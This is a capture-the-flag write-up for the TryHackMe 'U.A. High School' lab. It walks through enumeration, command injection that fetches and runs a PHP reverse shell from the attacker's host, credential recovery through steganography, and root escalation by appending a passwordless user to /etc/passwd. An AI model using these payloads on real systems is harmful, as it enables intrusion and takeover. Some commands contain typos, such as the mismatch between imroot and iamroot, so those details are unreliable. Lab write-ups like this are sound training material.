# [Tryhackme:U.A. High School](https://tryhackme.com/room/yueiua)
## Enumeration
Discover open ports on target machine
```bash
sudo nmap -Pn -T4 <target>
```

**Result**

![image](../../images/hig-1_clean.png)

result shows there is http server and open SSH port, first checking for version disclosure vulnerabilities. 

```bash
sudo nmap -p22,80 -sC -sV <target> -oN file.txt
```

![image](../../images/hig-2_clean.png)

**Both** services have up-dated version, So. I will do more discovering for HTTP server.

- **Directory enumeration**
```bash
gobuster dir -u "<target>" -w <wordlist>
```

![image](../../images/hig-3_clean.png)

inside this directory there is `/images` directory.

![image](../../images/hig-4_clean.png)

Fuzzing those directories files extension

```bash
gobuster dir -u "<target>/assets" -w <wordlist> -t 64 -x $(cat <common extensions file>)
```

![image](../../images/hig-5_clean.png)

`./.php` is prohibited but `/index.php` is working will. and also URL is vulnerable to Command injection.

![image](../../images/hig-6_clean.png)


**After some recon** I found that if we use this payload it shows us that we can we can write inside `/tmp` directory

```url
http://10.113.185.248/assets/index.php?cmd=cd /tmp;touch test;ls -l
```

So we can install reverse shell inside target machine to gain initial access.

---
## Initial Access 

1) **Create payload**
I used [pentest monkey php reverse shell](https://github.com/pentestmonkey/php-reverse-shell) "Don't forget to change LHOST and LPORT " then save it inside attacking machine.

2) **establish local http server and listener** to install shell inside target machine with `wget` or `curl`. then catch the reverse shell.

```bash
python3 -m http.server <port> #httpserver
nc -lnvp <AnotherPort> # listner
```

3) **Inject URL with payload**

```
http://10.113.185.248/assets/index.php?cmd=wget http://<attackingIP>:PORT/revshell.php; chmod 777 revshell.php; php revshell.php
```

Now we got shell 

![image](../../images/hig-9_clean.png)

--- 
## PrivEsc
### Enumeration

There is file called passphrase.txt inside `/var/www/Hidden_Content`

![image](../../images/hig-7_clean.png)

this file have decoded *base64* text inside it we can decode it 

![image](../../images/hig-8_clean.png)

Continuo to enumeration I found inside `/var/www/assets/images` images called `oneforall.jpg` in CTFs we can not trust any image because it may be steganography challenge.

downloading the image

![image](../../images/hig-10_clean.png)

if we check file we can figure out that this file is data not photo as extension indicates.

![image](../../images/hig-11_clean.png)

After that I'll open image inside `hexeditor oenforall.jpg` and change [magic bytes](if we check file we can figure out that this file is data not photo as extension indicates ) to jpeg bytes

![image](../../images/hig-12_clean.png)

No we can use `passphrase` we got above to decompress this `jpg`  data

![image](../../images/hig-13_clean.png)

and Bingo! we got credentials for the user Deku. Using this credentials to login via SSH

![image](../../images/hig-14_clean.png)

#### User flag

![image](../../images/hig-15_clean.png)

### Enumeration
Using [LinPEAS](https://linpeas.org/) to enumeration, found this file  `/opt/NewContent/feedback.sh` this file contain bash script. and this bash script have `eval` function that if we replace `$feedback` variable with anything we can print it inside any file because this file run with root privileges.

![image](../../images/hig-18_clean.png)

we can abuse `echo` to add root user to `/etc/passwd` using this command

```bash
# input 
imroot::0:0::/tmp/hacked:/bin/bash >> /etc/passwd
# su iamroot
su iamroot
```

![image](../../images/hig-16_clean.png)

#### root flag

![image](../../images/hig-17_clean.png)

